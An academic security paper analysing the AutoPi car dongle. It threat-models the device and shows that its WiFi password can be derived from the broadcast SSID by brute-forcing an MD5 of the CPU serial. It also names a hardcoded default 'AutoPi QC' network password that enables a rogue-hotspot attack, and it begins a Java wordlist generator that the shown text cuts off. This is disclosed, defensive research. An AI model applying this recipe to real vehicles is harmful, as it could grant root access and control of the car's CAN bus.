by entering our homes but also our vehicles. The demand
of attachable smart IoT products for cars is high. One such
product is the AutoPi, which connects the car to the internet and
allows for various features, usually found in high-end luxury
cars.

This paper presents an analysis of the cyber security aspects
of AutoPi. The ﬁndings presented shows that there is a critical
vulnerability in the system. The AutoPi can be exploited and full
access of the devices can be granted. The paper also discusses
what possible harm can be done through the found exploit.

Sammanfattning— Ambitionen f¨or Internet of Things (IoT)
apparater att bli en del av det vardagligalivet sker inte endast i
v˚ara hem, utan ¨aven i v˚ara fordon. Efterfr˚agan p˚a smarta IoT
produkter f¨or bilar ¨ar h¨og. En s˚adan produkt ¨ar AutoPi, vilket
ansluter bilen till Internet och m¨ojligg¨or f¨or diverse funktioner
vanligtvis funna i avancerade lyxbilar.

Denna uppsats presenterar en analys av cybers¨akerheten f¨or
AutoPi. Uppt¨ackterna som presenteras visar p˚a att det ﬁnns en
kritisk s¨akerhetsbrist i systemet och full ˚atkomst till apparaten
kan uppn˚as. Uppsatsen diskutera ¨aven m¨ojliga skador som kan
g¨oras genom den funna s˚arbarheten.

I. INTRODUCTION

The Internet of Things (IoT) is one of the hottest tech
terms today and is an increasingly debated topic as there
seems to be a boundless potential for improving everyday
lives. The idea of IoT is to attach embedded devices to
everyday objects to make them ”smart”. IoT is already taking
over the automotive industry were newer vehicles often
come standard equipped with internet connection and various
IoT technology such as autonomous driving [1]. Since the
automotive market to a large extent consist of second-hand
vehicles, the demand of attachable smart IoT products is
high. Many companies are now attempting to develop such
products [2].

The company AutoPi1 have developed a smart IoT dongle
for the car that enables various features to help and assist
the end-user. The AutoPi dongle supplies the user with
valuable information and diagnostics about the vehicle while
allowing various smart features, usually found in high-end
luxury vehicles. However, the amount of connected devices
that comes with the implementation of IoT technology and
especially having them so present in our daily lives, the
important topic of security arises. Manufacturers can often
overlook security in attempt of getting their product out on
the market as quick as possible. So how great is the security
risk of these devices and what harm can be done? This paper
presents an analysis of the cyber security aspects of AutoPi.

1https://www.autopi.io

II. BACKGROUND

This section introduces the reader to the topic and back-
ground information necessary for understanding the report.

A. ODB-II

On-Board-Diagnostics-II (ODB-II) is a standard which
regulates the look of the plug for the built-in car diagnostics
port. The ODB-II port allows for access to the vehicles vari-
ous sensors through communication with the cars Electronic
Control Unit (ECU). The port is a way for external hardware
to communicate with the vehicle internal system, often used
by workshops for diagnostics and identifying errors. In 1994,
the ODB-II was standardized for all cars in the United States,
with Europe following in 2001 for all gasoline fueled cars
and in 2004 for all diesel cars [3]. Since then, ODB-II has
evolved into a much higher level of functionality allowing
more advanced diagnostics with a much greater detail. Today,
there is a growing market for devices that utilizes ODB-II in
order to provide various functionality to the end user2.

B. CAN

The Controller Area Network (CAN) is the standardized
internal network protocol in the automotive industry. CAN
is an asynchronous, multi-layer serial bus communication
protocol accessible via the cars OBD-II port. It is the ﬁrst
widely accepted automotive bus protocol and has been the
standard for internal network in passenger cars for over 30
years. CAN is a broadcast type of bus, meaning that all
messages that are sent on the network are available system-
wide. The nodes in the CAN network are in fact ECUs, each
controlling a certain set of functions within the vehicle. It
relies on several rules for which node gets to transmit over
the network and which listens. The CAN frame includes a
destination ﬁeld and data is multicasted on the bus where
nodes only address data which is addressed to them [5].
However, CAN was not designed to be secure from intrusion
[4], but rather to enable fast and stable communication. It
relies on that only the desired receivers are connected to the
network since there is no information about the source in
the frames, meaning that receiving nodes cannot now from
where the messages was sent and ultimately determine if it
is trustworthy or not.

C. Raspberry Pi

In 2012, the ﬁrst version of the Raspberry Pi was released
and has since become an attractive product with its small
size, relative good performance, low power consumption and

2https://www.marketwatch.com/press-release/global-obd-aftermarket-
industry-to-surpass-15bn-by-2024-global-market-insights-inc-2018-08-28

affordable price. The Raspberry Pi is a simple single-board
computer, which unlike a microcontroller, runs an operating
system and also has a much faster CPU. The result is a
credit-card sized computer capable of performing most of
the tasks of a regular computer. The platform also features
WiFi, Bluetooth, Ethernet, HDMI and USB ports. It runs
on an operating system named Raspbian which is a Debian-
based Linux distribution [10].

D. AutoPi

AutoPi provides a service to make your car a ”smart car”.
A dongle is inserted into the OBD-II port of the car which
gives the dongle access to the cars internal systems. AutoPi
also provides a cloud service that lets you communicate with
the dongle remotely over the Internet.

The dongle is built on a Raspberry PI Zero which makes
it a very powerful IoT-device. Hardware of the dongle that is
of interest in this paper are WiFi, Bluetooth, 4G, A-GPS, two
USB ports and a mini-HDMI port. The dongle runs a Web
server and a Secure Shell (SSH) server which are reachable
from the internal WiFi network.

The dongle also runs software developed by the AutoPi
team to simplify communication with the car and dongle. For
instance, the provided API lets the user run simple HTTPS
requests to record and replay commands on the CAN bus.
The software is open source under the Apache License and
can be found on github3.

The AutoPi is sold in several editions offering differ-
ent services. This paper will address the ”4G/LTE Edition
GEN2”-edition which is the fully equipped high end model.
Some results presented in this paper might be applicable to
other models as well.

E. Threat Modelling

Threat modeling is used to get a better understanding
of possible security threats to a system [12, p. 32]. The
process usually starts by producing a very general idea about
possible threats and stepwise produce more tangible and
detailed threats. A good threat model will not only help
ﬁnding threats, but also help prioritize threats according to
their severity and discoverability.

F. Ethics

The paper is focused on testing security of an IoT device
intended for cars. This is done by hacking and ﬁnding
vulnerabilities in the device. This raises an ethical dilemma.
Is it morally okay to ﬁnd and publish vulnerabilities of
devices which can be used for something harmful, even if
the motive behind it is good?

To make tech products unhackable, they basically have to
be very simple with less functionality. However, tech prod-
ucts are getting more and more complex with advanced sys-
tems and greater functionality. This leaves much more room
for security ﬂaws in those products. These security ﬂaws can
be exploited by hackers. Normally, when people hear the
word hacker, they think of criminals. But there are ”ethical

3https://github.com/autopi-io/autopi-core

hackers”, who for a living, exposes the vulnerabilities of
these products. The reasoning behind ethical hacking is that
it is better for someone ”good” to ﬁnd the vulnerabilities
before someone ”bad” ﬁnds them. Hence, it is better for
someone trusted to ﬁnd and report the vulnerabilities before
criminals exploit them.

When ﬁnding a vulnerability, it is important to disclose it
in a responsible way. This is done by notifying the developers
of the vulnerability and giving them time to patch it before
disclosing the vulnerability to the public. For the vulner-
abilities found in this paper, a 90 day disclosure deadline
was given to the developers. This method of responsible
disclosure is taken from the Google Project Zero4 to match
industry standards. A deadline also pushes the developers
to patch the system and improve their security in a timely
manner.

III. THREAT MODELING

The thread model is the foundation of which the security
testing is based upon. The threat modeling for the AutoPi
system documented in this paper follows the steps described
in the book ”IoT Penetration testing cookbook” [12, p. 42].

A. System Model

The premise of the AutoPi service is to let its end users
have full control over their dongles and modify them to ﬁt
their needs. This opens up for possible security holes as the
end users might not be particularly experienced with security.
Since the possibility of modiﬁcation is practically endless,
it is impossible to consider all possible security risks in
this paper. Therefore, the paper is focused on security of
dongles using the pre-installed hardware and software with
only slight modiﬁcations of the default settings.

Figure 1 is a simple overview of the system components
that pose a security risk. Every item in the ﬁgure is explained
in more details in the list underneath. Components that we
do not see as a possible security threat have been excluded
from our system model.

1) AutoPi: This is the main device. The dongle is built
on a Raspberry PI Zero with Raspbian as the pre-
installed operating system. This opens up for potential
attack surfaces since the Raspberry PI contains more
complexity compared to a simple embedded system.
While the car is turned off, the dongle will sleep for
cycles of 2 hours and wake up for 5 minutes between
sleep cycles. This is to prevent drainage of the car
battery.

2) Bluetooth: The AutoPi comes with Bluetooth 4.1 and
Bluetooth Low Energy (BLE). There are no default soft-
ware on the device which uses Bluetooth. It is mainly
for connecting third-party products through, combined
to accomplish
with self-written code on the device,
some wanted feature.

3) Physical connections: The devices comes with physical
ports that can be used to for implementing additional

4https://googleprojectzero.blogspot.com/2015/02/feedback-and-data-

driven-updates-to.html

the SaltStack protocol.

9) Web Portal: The web portal, also known as the Au-
toPi Cloud software platform, allows for a dashboard
environment where the user remotely can monitor and
perform certain actions regarding the AutoPi. For in-
stance, the web portal displays data both from the cars
internal computer and from external devices connected
to the AutoPi. The web portal also includes a terminal
for sending commands to be run on the AutoPi. The
terminal provided grants the user with root access.

B. Identifying Threats

The simpliﬁed threat model in Figure 1 gives an overview
of attack vectors. The threat model is then used to identify
explicit threats to help with documentation of threats. The
STRIDE method is used to get a general understanding of
possible threats. The most severe and discoverable threats
found via the STRIDE method are documented in greater
detail and ranked according to the DREAD method.

C. STRIDE

The STRIDE method is used to identify and categories
threats [12, p. 49] and is a commonly used in threat modeling
of vehicles [6]. STRIDE is an acronym for Spooﬁng of user
identity, Tampering, Repudiation, Information Disclosure,
Denial of Service and Elevation of Privilege.

These categories are used to help and ensure that all type
of threats are considered. The threats found with the method
can be seen in the list underneath:

Spooﬁng of user identity
– Claiming to be another user to get control over other

dongles.

– Pretending to be the cloud server and intercept trafﬁc
from users and dongles destined to the real cloud
server.

– Impersonating another dongle to retrieve unautho-

rized information from the cloud server.

Tampering
– Modifying data sent between client, dongle and

server.
Repudiation
Information Disclosure
– Intercept data sent between client, dongle and server.
– Capture data sent on the vehicles CAN bus.
– Set up a monitoring access point.
Denial of Service
– Bring down the dongles WiFi to prevent communi-

cation between client and dongle.

– Bring down the dongles 4G connection to prevent

communication between dongle and server.

Elevation of Privilege
– Bypass WiFi authorization and connect to the device

with root access.

– Brute force web portal password to access dongle

web platform which gives root access.

Fig. 1. Simpliﬁed threat model

functionality to the dongle. The dongle has two USB
2.0 ports, one mini-HDMI port and 18 GPIO pins.
4) OBD: The device is connected to the OBD-II port of the
car. The OBD-II port provides the dongle with power
and is also used for communication between dongle and
car. Some examples of functions that this port can be
used for are remotely starting the car5 or unlocking the
car6.

5) WiFi: The device can act both as a WiFi hotspot and a
WiFi client. When connected to 4G, the device can be a
WiFi hotspot so that other may connect to the network
to gain internet connection. Also, the device itself can
connect
to a WiFi network to establish an internet
connection without depending on 4G connection. When
connected to the AutoPi dongles WiFi network, one
have access to the local web portal of the devices. The
web portal allows for various network conﬁguration,
also including a terminal
to run commands on the
device.
When connected to the WiFi, it is also possible to
SSH into the device. Both the web portal terminal and
the SSH terminal grants root access, meaning that full
access of the devices is given when connected through
WiFi.

6) GPS: The device comes with a GPS module for real-
time tracking of position, speed and altitude. It includes
Assisted-GPS (A-GPS) to improve startup performance.
7) 4G: Internet connection is provided through a built in
4G-module. A sim-card is required. This is a highly
secure network since 4G encrypts the trafﬁc between
the device and the base station [11].

8) Cloud Servers: There are two cloud servers providing
different services. One server communicates with end
users and one communicates with dongles. The com-
munication with end users will be sent over HTTPS
and the communication with dongles will be sent with

5https://www.autopi.io/use-cases/remote-start/
6https://www.autopi.io/use-cases/auto-lock-unlock/

The four threats that we saw as most severe and discover-
able was documented in greater detail. These threats can be
seen in Tables I through IV.

TABLE I

THREAT 1

Threat description

Threat target
Attack techniques
Countermeasures

Intercepting and modifying trafﬁc sent between
dongle and server
Network interface between dongle and server
Man-in-the-middle between dongle and server
Authorize the dongle and server to each other

The threats can then be prioritized according to their total
score. The DREAD ranking can be seen in Table V.

TABLE V
DREAD RANKING

Threat 1
2
2
1
3
1
9

Threat 2
3
1
2
1
2
9

Threat 3
3
1
3
1
2
10

Threat 4
2
2
3
3
2
12

D
R
E
A
D
Total

TABLE II

THREAT 2

Threat description

Threat target
Attack techniques

Countermeasures

Attacker bypasses the WiFi authorization and
connects to the dongles WiFi network
AutoPi dongle
The attacker brute forces a large variety of
common/random passwords to authenticate to
the network
Use complex password

TABLE III

THREAT 3

Threat description

Threat target
Attack techniques

Countermeasures

Claiming to be another user to get control over
dongles that the perpetrator should not have
access to
Web server and access tokens
Phishing or bruteforce to obtain login creden-
tials. Modiﬁcation of access tokens.
Preventing large numbers of login attempts in a
short amount of time and reduces login veriﬁca-
tion speed. Thorough checks on access tokens

IV. THEORY

With consideration to the threat model from previous
chapter, it is evident that the greatest attack vectors are
communication involving the cloud server and the WiFi
network since three out of the four threats are applicable
to those component. The WiFi is remotely accessible from
outside of the car and a host connected to the WiFi network
will have root access to the device. The same applies to the
cloud server. This paper is therefore primarily focused on
threats regarding those two components.

A. Dongle services

Services running on the dongle that are of interest to this
paper is services that are remotely reachable. This includes
services that are listening on a speciﬁc port that is reachable
through the ﬁrewall of the dongle or services that in some
way communicate with hosts outside the dongle. The Iptable
rules of the dongle7 speciﬁes the open ports on which the
dongle listens (these services are only reachable from the
dongles local WiFi network). They can be seen in Table VI.

TABLE VI
OPEN PORTS AND CORRESPONDING SERVICES

TABLE IV
THREAT 4

Threat description
Threat target
Attack techniques
Countermeasures

Vulnerable services running on the dongle
AutoPi dongle
Scanning ports
Keep services up-to-date and implement good
ﬁrewall rules

D. DREAD

The threats were ranked according to the DREAD
method[12, p. 33]. DREAD is an acronym for Damage
potential, Reproducibility, Exploitability, Affected users and
Discoverability.

Every threat were given a score between 1 through 3 for
every category (1 being the lowest value and 3 the highest).
The score of all categories were summed to give a total score.

Service
SSH
DNS
DHCP
HTTP
HTTP (API)

Port
22 (TCP)
53 (TCP & UDP)
67 (UDP)
80 (TCP)
9000 (TCP)

Because of the strict ﬁrewall rules,

the only services
reachable from hosts outside the dongles own local WiFi are
services that initiates the connection towards outside hosts.
Some of the applications running on the dongle might have
known vulnerabilities that can be used to exploit the dongle.
A common way of ﬁnding vulnerabilities for applications are
with the use of the Common Vulnerabilities and Exposures
(CVE) list8 which contains publicly known vulnerabilities.

7https://github.com/autopi-io/autopi-core/blob/master/src/salt/base

/state/network/wlan/hotspot/iptables-ipv4.rules

8https://cve.mitre.org/

The services that are reachable remotely within WiFi range
are: the WiFi hotspot (hostapd version 2.4), the WiFi client
(wpa supplicant version 2.4) and the WiFi DHCP client
(dhcpcd version 6.11.5). Services that communicate over the
Internet are SaltStack (version 2017.7.5) and HTTPS request
are sent via the python library requests (version 2.12.4).
There are no severe vulnerabilities reported of these services
applicable to the dongle.

B. Wiﬁ hotspot

The WiFi hotspot is conﬁgured to use WPA2 encryption
with a 12 hexadecimal number as password. The password
is obtained from the ﬁrst 12 characters of the dongle id and
the SSID is the 12 last characters of the dongle id prepended
with ”AutoPi-”. The dongle id is the same as the minion id
which is used by the dongle to identify itself to the salt-
master. The process of producing the minion id can be seen
on row 9 in the minion install ﬁle9:

- name: "grep Serial /proc/cpuinfo | awk ’{print
$3}’ | md5sum | awk ’{print $1}’ | tee
/etc/salt/minion_id | cut -c21- | sed
’s/ˆ/autopi-/g’ > /etc/hostname"

The minion id is a Message Digest 5 (md5) hash of the
Raspberry Pis serial number found in /proc/cpuinfo. Md5
is a hash function which purpose is to create signatures
of large ﬁles and is therefore designed to be a fast hash
function [9]. It is not intended to encrypt the given input. The
serial number is a random string between ”00000000” and
”FFFFFFFF” with 8 zeros padded in front. 8 hex characters
gives a total of 168 possible combinations. This means that
there are 168 possible outputs from the md5 hash function
with a serial number as input. So even though the md5 hash
is 32 hex characters long, there are only a small subset (168)
of those combinations used. One can also see that the last
12 characters of the md5 hash (preﬁxed with ”AutoPi-”) is
used as the hostname of the dongle.

C. Wiﬁ client

The WiFi client is continuously trying to connect to known
WiFi networks. If it is connected to a WiFi AP, the WiFi
connection will be preferred over the 4G network. This
means that the dongle will send all outgoing trafﬁc over the
WiFi connection, including its DNS request.

D. Cloud servers

The cloud service can be divided into three distinct parts:

The website, the RESTful API and the salt-master.

1) Website: The website uses django auth for authentica-
tion10. Anyone is free to create an account. A dongle
is linked to a speciﬁc account by entering the dongles
dongle id. An account can be linked to multiple dongles.
As default, a dongle is only allowed to be linked with
one account, but that limit can be increased by the

AutoPi staff manually if requested. Most of the websites
functionality uses the RESTful API as backend.

2) RESTful API: The API service runs over HTTPS and
provides a simple way to communicate with the cloud
service. Authentication is done using the Authorization
header of the HTTPS request. There are two types of
tokens that can be used to authorize an API call: a
”bearer”-token or a ”token”-token.
The ”bearer”-token is obtained by providing a valid
username and password. The returned token has the
JSON Web Token (JWT) format11. The JWT token is
base64 encoded and separated into three parts: Header,
payload and signature.
The headers (in AutoPis implementation of the JWT)
speciﬁes the algorithm used for the signature and that
this is in fact a JWT token. The algorithm used is
HMAC-SHA256 [7] which is highly secure unless a
very simple key is provided during encryption.
The payload contains the username, user id and e-mail
of the user that this token is valid for. It also contains
the date at which this token becomes invalid. This is set
to eight hours.
The signature is, as state previously, created with the
HMAC-SHA256 algorithm which takes the headers and
payload as input combined with a secret key. This
provides integrity as a modiﬁcation of the headers or
payload will invalidate the signature.
The ”token”-token is a static value that is used by
the dongle to communicate with the cloud server au-
tonomously without any user interaction. It can only be
used to upload event data and retrieve custom modules
from the cloud.

3) Salt-Master: AutoPi uses SaltStack to simplify the
infrastructure and communication between their cloud
server and the dongles. SaltStack uses a publish and
subscribe pattern. The dongles (also known as salt-
minions) subscribe to topics and the server (also known
as the salt-master) publishes data on those topics. Salt-
stack’s implementation of the pattern ensures that it is
the salt-master that initiates all communication.
The authentication between salt-master and salt-minion
are done using a minion id (which is the same as
the dongle id) and RSA keys. The ﬁrst time the salt-
minion connects to the salt-master, the salt-master saves
the RSA public key received from the salt-minion and
links it to the corresponding minion id. The salt-minion
saves the RSA public key received from the salt-master.
This procedure is done before the product is sent to
the customer and ensures that the salt-master and the
salt-minion have a way to authenticate each other. All
subsequent trafﬁc sent between the two is encrypted
using Advanced Encryption Standard (AES).

9https://github.com/autopi-io/autopi-core/blob/master/src/salt/base/state

/minion/install.sls

10https://docs.djangoproject.com/en/2.2/topics/auth/

11https://jwt.io/introduction/

V. METHOD

This chapter introduces the methodology used throughout

the work.

A. WiFi hotspot

As all trafﬁc on the WiFi network is securely encrypted,
there are not much information gained from snifﬁng the
trafﬁc from a host outside the network. The only information
that can be gathered are the MAC-addresses of computers
on the network and the SSID used by the access point.
This leaves two possible entry points: gaining access by
manipulating the back end hostapd application during the
WPA2 handshake or gaining access by sending the correct
password.

The fastest way to brute force a WiFi network is to
catch the 4-way handshake used in the WPA2 protocol
to authenticate a client with the AP12. These packets can
then be used to brute force the password locally. Since
the password is a 12 character hex string, there are 1612
possible combinations. Using hashcat13 on a GPU doing ˜180
kHashes/sec would go through all possible 12 hex character
passwords (1612) in:

1612
180000

≈ 50 years

With the knowledge that there are only 168 possible dongle
ids (from which the WiFi password is taken), one can brute
force the passwords in 168 tries:

168
180000

≈ 6.6 hours

The SSID of the network contains the 12 last characters
of the dongle id. The SSID is broadcasted to everyone in the
vicinity of the car. This information can be used to deduce
the whole dongle id which contains the WiFi password.

All dongle ids with the last 12 characters equal to the 12
characters of the SSIDs is candidates for being the correct
dongle id. This method does not require the attacker to
catch a WPA2 handshake which means that it can be used
without the need for an external user to be connected to the
network. This method is also a lot faster since the md5 hash
is designed to do fast hashing of large ﬁles [9] while the
PBKDF2 used in WPA2 is deliberately slow to reduce the
effectiveness of brute force attacks [8].

A program was written in java to exploit this vulnerability.
The program took the 12 hex characters of the SSID as input
and returned all possible dongle ids. This program went
through multiple iterations to optimize the run time. The
program was later branched out into two programs using
different methods: one using GPU supported brute forcing
and one precomputing a wordlist containing all possible
dongle ids sorted by their last 12 characters (the part found
in the SSID) that can be search through by e.g. a binary
search algorithm.

12https://www.aircrack-ng.org/doku.php?id=cracking wpa
13https://hashcat.net/wiki/

As the ﬁrst method requires a powerful GPU and the other
method requires a lot of disk drive space, both programs were
run on a desktop computer. The programs listened on a TCP
port for the input SSID and returned the correct hash over
the TCP connection which allows a perpetrator to perform
the hack remotely within the WiFi range of the car.

B. WiFi client

When connected to the AutoPi through its WiFi hotspot,
one can access the local web portal of the device through
local.autopi.io. This portal is, among others, used for network
conﬁguration and is where the user would conﬁgure the 4G
or the WiFi connection. However, the WiFi already comes
preconﬁgured with one network. There is a preconﬁgured
WiFi network with SSID ”AutoPi QC” and password ”au-
topi2019”, which we assume is for the manufacturers quality
control, hence the ”QC”. To exploit this, a hotspot was set
up with these credentials. The AutoPi is conﬁgured so that it
prioritizes known WiFi networks over a 4G connection. Since
the AutoPi is constantly scanning for known WiFi networks,
the connection to the fake WiFi hotspot was established in
less than a minute and all trafﬁc is directed to the WiFi
network instead of via the 4G connection.

C. Cloud servers

To exploit the found WiFi client vulnerability further, a
DNS spooﬁng attack was done. The goal behind doing a
DNS spooﬁng attack is to make the AutoPi believe it is
communicating with the AutoPi cloud server, when in fact
it is communicating with our ”fake” server. Whenever the
AutoPi send a DNS request, the response will be the IP
address of our fake server, since the AutoPi is connected
to our controlled network. As the AutoPi receives the IP
address, it will set up a TCP connection to the fake server.
AutoPi uses SaltStack for communication between server and
dongles. It also send speciﬁc event data over HTTPS.

Since the tests in this paper is done directly on the live
cloud servers, care have been taken to not disturb the service.
Only test that have no way of reading, editing or in some
way affect other users data or service have been performed.
Authentication tokens have been modiﬁed in different
ways to try and gain unauthorized access to send commands
to the dongle via the cloud API.

VI. RESULTS

This chapter describes the ﬁndings of the work.

A. WiFi hotspot

The two vulnerabilities found compliments each other
which makes the WiFi hotspot, using the default SSID
and password, exploitable. The ﬁrst vulnerability is that the
dongle ids are derived from a input with a 8 hex character
variance. This reduces the possible subset of dongle ids from
1632 to 168 and possible passwords from 1612 to 168. The
other vulnerability is that the last 12 characters of the dongle
id is broadcasted as the SSID. This, in combination with
the ﬁrst vulnerability, allows for a faster brute force attack
without the need to catch a WPA handshake.

Since the method used to derive the password from the
SSID is done by taking 12 characters of the hash and
trying to ﬁnd the whole 32 character hash, the method could
return multiple candidates since multiple hashes might have
the same 12 last characters. The probability of a evenly
distributed 32 hex character hash having the same last 12
characters is:

1620
1632 =

1
1612

This probability is the same as the probability of at least
two dongles having the same SSID. Since it is such a small
number, it is negligible.

As stated before in the method paragraph, the end re-
sult where two programs utilizing different methods: one
using GPU supported brute forcing and one precomputing
a wordlist containing all possible dongle ids sorted by their
last 12 characters (the part found in the SSID) that could
searched through with a binary search algorithm. The code
can be found in the Appendix of this document.

The GPU program is written in java with CUDA14. Run-
ning the program on a GeForce GTX 1060 going through all
168 possible combinations took <1 second.

The wordlist created with the second method contained
168 hashes with every hash being 16 bytes (128 bits). This
gave a ﬁle size of:

168 · 16 ≈ 69 GB

Using a binary search algorithm on the sorted list with

168 hashes gives a maximum time complexity of:

log2 168 = 32

B. WiFi client

We are not quite sure if the preconﬁgured WiFi interface
is just a random error or a production ﬂaw. But we know for
certain that the two AutoPi dongles which we have access
to, came preconﬁgured with the ”AutoPi QC” WiFi network
and with the same ”autopi2019” password. Therefore, it is
possible to set up a WiFi hotspot using this information and
the AutoPi dongle will in a short time connect to that hotspot,
without the owner being aware of it. The one in control of
the hotspot can then perform several attacks such as trafﬁc
snifﬁng or DNS spooﬁng.

The dongle includes its hostname in the DHCP discovery
broadcasted to the DHCP server. The dongles hostname
contains the last 12 characters of the dongle id.

The Iptable rules for the WiFi client interface only allows
related connections, forwarding and output15. This means
that we were able to reach hosts on the dongles internal
trafﬁc directed
network via the forwarding rule, but all
directly towards the dongle is dropped under the input rule.
We were therefore only able to reach the dongle directly
when it sets up outgoing connections.

14https://developer.nvidia.com/cuda-zone
15https://github.com/autopi-io/autopi-core/blob/master/src/salt/base/state

/wlan/hotspot/iptables-ipv4.rules (interface wlan0)

C. Cloud servers

By performing a DNS spooﬁng attack, the AutoPi dongle
can be tricked into believing it
is communicating with
the AutoPi Salt-Master server. As the dongle receives the
response of the DNS request with the fake IP address, it will
try to set up a TCP connection with that server. However, the
AutoPi dongle and server uses RSA keys for authentication
during the SaltStack handshake. The dongle sets up the TCP
connection and sends its public RSA key which then gets
to the fake server. It also identiﬁes itself with its minion
id, which is the same as the dongle id, and contains the
SSID and WiFi password. When the fake server responds
with its public key, the connection is shut down since the
AutoPi dongle notices that it is not matching the real AutoPi
Salt-Master key. Hence, the DNS spooﬁng attack was not
successful. Any man-in-the-middle attack is futile.

The dongle does also send event data over HTTPS to the
server. Since HTTPS needs a valid certiﬁcation, in this case
for the domain ”autopi.io”, the dongle will not send any data
to the fake server. The HTTPS sent from the dongle uses the
”token”-token in the authorization header. This is the weaker
authentication with very limited use. So even if one is able to
fake a valid certiﬁcate, the HTTPS data and the intercepted
token would not be to any great use.

VII. DISCUSSION

Depending on what add-ons is combined with the dongle,
AutoPi presents a load of features. It is truly a product that
brings a great upgrade to the car. But is it secure?
The premise of the AutoPi service is to let

its end
user have full control over their product. To accommodate
this, restrictions have to be relaxed to allow custom code
and modiﬁcations. This leads greater damage potential for
found vulnerabilities and it is therefore important to have
a very secure outer layer. AutoPi achieves this by using
external libraries and software that have proven themselves
to be secure. Everything sent from the dongle and cloud
servers are encrypted ensuring conﬁdentiality, integrity and
authentication.

The found vulnerabilities stems from human conﬁguration
errors rather than vulnerable software. The vulnerability
found regarding the WiFi credentials can be exploited on
any AutoPi dongle using the default WiFi settings. There
is no way of knowing exactly how many dongles that are
vulnerable to the exploit. Since the default password seems
to be a 12 hex character long random generated string, it
might give people the illusion of being secure and it would
thus reduce the amount of people changing the password.

Because of the previously mentioned balance between
availability and security, the found exploit gives a perpetrator
full root access to the dongle.

The AutoPi is marketed as product with various features.
Depending on the vehicle combined with the AutoPi, the
execution of certain operations can be achieved. One such
operation is to record and replay commands sent on the
vehicles CAN bus. All communication to the ECUs goes
through the CAN bus. On certain car models, commands

[6] W. Xiong, F. Krantz, and R. Lagerstrm, Threat modeling and attack
simulations of connected vehicles: a research outlook, in the Proc. of
the 5th International Conference on Information Systems Security and
Privacy (ICISSP), page 2, paragraph 2.4, Feb 2019.

[7] D. Eastlake and T. Hansen, ”US Secure Hash Algorithms (SHA and
HMAC-SHA)”, Internet Request for Comments, vol. RFC 4634, page
14, paragraph 7, Jul 2006.
Available: https://tools.ietf.org/html/rfc4634

[8] B. Kaliski, ”PKCS #5: Password-Based Cryptography Speciﬁcation
Version 2.0”, Internet Request for Comments, vol. RFC 2898, page 8,
paragraph 5.2, Sep 2000.
Available: https://www.ietf.org/rfc/rfc2898.txt

[9] R. Rivest, ”The MD5 Message-Digest Algorithm”, Internet Request
for Comments, vol. RFC 1321, page 0, paragraph 1, Apr 1992.
Available: https://www.ietf.org/rfc/rfc1321.txt

[10] Raspbian, ”Raspbian FAQ”, paragraph ”What

is Raspbian?”, Apr

2019.
Available: https://www.raspbian.org/RaspbianFAQ#What is Raspbian.
3F

[11] J. Cichoniski and J. Franklin, ”LTE Security How Good Is It?”, RSA

Conference 2015, slide 34, Apr 2015.
Available: https://www.rsaconference.com/writable/presentations/
ﬁle upload/tech-r03 lte-security-how-good-is-it.pdf

[12] A. Guzman and A. Gupta, IoT Penetration Testing Cookbook, Packt

Publishing Ltd., Nov 2017.

such as unlocking the vehicle and starting the engine runs
on the CAN bus. Hence, the manufacturer has provided a
feature that lets the one in control of the AutoPi unlock and
start the car.

There is a substantial amount of actions that can be
performed by controlling an AutoPi unit connected to a car.
But the most severe is the controlling of the CAN bus. By
being able to send commands on the CAN bus, the actions
of the vehicle can be manipulated. Hence, raising a serious
amount of safety and security issues.

VIII. FUTURE WORKS

Since this paper has been done independently of AutoPi,
there are a lot more to test regarding the cloud service. Great
care have been taken to not affect the service of the cloud
servers which constrains the amount of test that can be done
and how thorough those tests can be.

The tests in this paper have been performed on a device
with default settings and no extra add-ons. The premise of
the AutoPi dongle is to allow implementation of custom code
and adding extra hardware. This is something that could be
looked into further. Examples are the Bluetooth module and
the USB ports. Since they are not used with default software
and hardware, there have been no security testing of them in
this paper.

IX. CONCLUSIONS

This paper shows that a product might have vulnerabilities
even though the development of the product have been
heavily security focused. A simple oversight regarding the
generation of the SSID and password of the device led to a
security exploit in an otherwise very secure device.

ACKNOWLEDGEMENT

We would like to thank our supervisors Robert Lagerstr¨om
and Pontus Johnson for their support and guidance through-
out the entire work.

REFERENCES

[1] A. Meola ”Automotive Industry Trends: IoT Connected Smart Cars &

Vehicles”, Business Insider, Dec 2016.
Available: https://www.businessinsider.com/internet-of-things-connect
ed-smart-cars-2016-10?r=US&IR=T

[2] Ericsson, ”Digital transformation and the connected car”, Ericsson

Mobility Report, Nov 2016.
Available: https://www.ericsson.com/assets/local/mobility-report/docu
ments/2016/emr-november-2016-digital-transformation.pdf

[3] European Parliament, ”DIRECTIVE 98/69/EC OF THE EUROPEAN
PARLIAMENT AND OF THE COUNCIL of 13 October 1998 relating
to measures to be taken against air pollution by emissions from motor
vehicles and amending”, page 21, paragraph 8.2, Oct 1998.
Available: https://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=C
ONSLEG:1998L0069:19981228:EN:PDF

[4] R. Currie, ”Hacking the CAN Bus: Basic Manipulation of a Modern
Automobile Through CAN Bus Reverse Engineering”, SANS Institute
Information Security Reading Room, page 2. paragraph 1, May 2017.
Available: https://www.sans.org/reading-room/whitepapers/threats/pap
er/37825

[5] International Organization for Standardization, ”Road vehicles – Con-
troller area network (CAN)”, ISO 11898-1, page 5, paragraph 6.1, Dec
2013.
Available: http://read.pudn.com/downloads209/ebook/986064/ISO%20
11898/ISO%2011898-1.pdf

APPENDIX

CreateSortedWordlist.java

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.PriorityQueue;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ForkJoinPool;
import java.util.concurrent.RecursiveAction;

public class CreateSortedWordlist {

static final int HASH_LENGTH = 16;
static String PATH;
static long STATUS_MESSAGE;

// 16 bytes (= 128 bits per md5 hash)

static int
static int
static int

AMOUNT_OF_THREADS;
AMOUNT_OF_OUTPUT_BUFFERS;
AMOUNT_OF_INPUT_BUFFERS_PER_BLOCK;

static long BYTES_PER_BLOCK;
static long BYTES_IN_BUFFERS;
static long BYTES_IN_QUEUES;

static long AMOUNT_OF_BLOCKS;
static long AMOUNT_OF_HASHES;

public static void main (String[] args) throws NoSuchAlgorithmException, InterruptedException,
Exception {

PATH = "list";
String start
String end
STATUS_MESSAGE = 200000000;
of this number" hashes has been merged

// output path

